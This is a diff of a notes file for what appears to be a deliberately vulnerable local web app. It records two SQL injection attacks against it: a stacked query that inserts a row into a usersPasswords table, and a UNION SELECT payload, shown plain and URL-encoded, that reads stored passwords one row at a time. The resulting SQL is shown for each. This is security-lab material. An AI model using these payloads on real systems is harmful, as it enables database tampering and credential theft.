@@ -46,10 +46,22 @@ http://www.k-press.ru/cs/2009/1/ts/ts.asp
 *****************************          ATTACKS             *******************************
 ***************************************************************************************
 # SQL injections attacks
+1) Inserting data into any table
+* SQL injection
 Attack vector: http://localhost:8084/editUser?userId=1
-Field: any text field - i.e. Phone Operator
-';  INSERT INTO usersPasswords(name, password) VALUES('Leo333', '333Password'); --
+    Field: any text field - i.e. Phone Operator
+* attack string
+    ';  INSERT INTO usersPasswords(name, password) VALUES('Leo333', '333Password'); --
+Resulting SQL _________________________________________________________________________**********************************************************************************_____________________________
+    UPDATE users SET  name = 'Ivan', phoneNumber = '233234234', phoneOperator = 'Orange';  INSERT INTO usersPasswords(name, password) VALUES('Leo333', '333Password'); --', balance = 43200 WHERE id=1;
 
 
-Resulting SQL _____________________________________________________________________**********************************************************************************_____________________________
-UPDATE users SET  name = 'Ivan', phoneNumber = '233234234', phoneOperator = 'Orange';  INSERT INTO usersPasswords(name, password) VALUES('Leo333', '333Password'); --', balance = 43200 WHERE id=1;
+2) Enumerating data from any table by 1 row
+* SQLi UNION
+Attack vector: http://localhost:8084/api/user/1
+    Field - 1
+* attack string
+    ' UNION SELECT id, name, password, password, id FROM usersPasswords LIMIT 1,1--'
+    '%20UNION%20SELECT%20id,%20name,%20password,%20password,%20id%20FROM%20usersPasswords%20LIMIT%202,1--'
+Resulting SQL _____________________********************************************************************************_
+    SELECT * FROM users WHERE id='1' UNION SELECT id, name, password, password, id FROM usersPasswords LIMIT 1,1--''
